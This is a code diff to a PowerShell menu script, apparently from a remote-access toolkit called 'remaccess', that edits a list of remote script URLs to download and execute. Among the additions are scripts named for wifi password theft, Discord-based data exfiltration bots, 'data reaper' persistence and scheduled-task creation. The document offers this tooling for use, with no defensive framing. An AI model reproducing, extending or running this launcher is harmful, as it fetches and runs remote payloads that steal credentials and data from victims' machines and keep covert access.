@@ -41,16 +41,18 @@ function Show-ActionMenu {
 # Define an array of action URLs
 $actions = @(
     "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/CleanUp.ps1",
+    "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/AutomatedTaskWithPingInstall.ps1",
     "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/PreampCoreDownload.ps1",
     "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/BasicInletValveInstall.ps1",
     "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/MeshNetworkInstall.ps1",
     "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/SearchDog.ps1",
-    "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/DiscordDataTransportBot.ps1",
     "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/ReconService.ps1",
     "https://gist.githubusercontent.com/CybersamuraiDK/6e0be5c0c47165228895079efa8d98ec/raw/01f60731ba1602f5e8b45c2c3ed1532a5d4373d6/wifi-passwords.ps1",
+    "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/DiscordDataTransportBot.ps1",
+    "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/DiscordAutoDataReaperBots.ps1",
+    "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/WifiPersistentDataReaper.ps1",
     "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/TaskSchedulerServiceCreater.ps1",
     "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/PingTaskSchedulerCreator.ps1",
-    "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/DiscortAutoDataReaperBots.ps1"
 )
 
 # Call the function to display the action menu and execute the selected action or quit
